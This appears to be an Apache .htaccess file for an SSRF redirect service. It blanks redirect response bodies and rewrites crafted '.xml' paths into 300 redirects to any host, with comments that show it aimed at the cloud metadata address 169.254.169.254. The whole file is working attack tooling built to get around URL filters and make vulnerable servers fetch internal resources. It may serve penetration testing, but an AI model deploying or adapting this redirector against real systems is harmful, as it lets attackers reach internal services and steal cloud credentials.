# Set blank response body
ErrorDocument 300 " "
ErrorDocument 301 " "
ErrorDocument 302 " "
ErrorDocument 303 " "
ErrorDocument 307 " "
ErrorDocument 308 " "

# 300 without response body
# http://ssrf.localdomain.pw/xml-without-body/300-http-169.254.169.254:80-.j.xml
# http://ssrf.localdomain.pw/xml-without-body/300-http-169.254.169.254:80-test/.j.xml
RewriteEngine on
RewriteCond %{REQUEST_URI} 300-([^/-]*)-([^/-]*)-(.*).j.xml$
RewriteRule 300-([^/-]*)-([^/-]*)-(.*).j.xml$ $1://$2/$3 [L,R=300,NC]

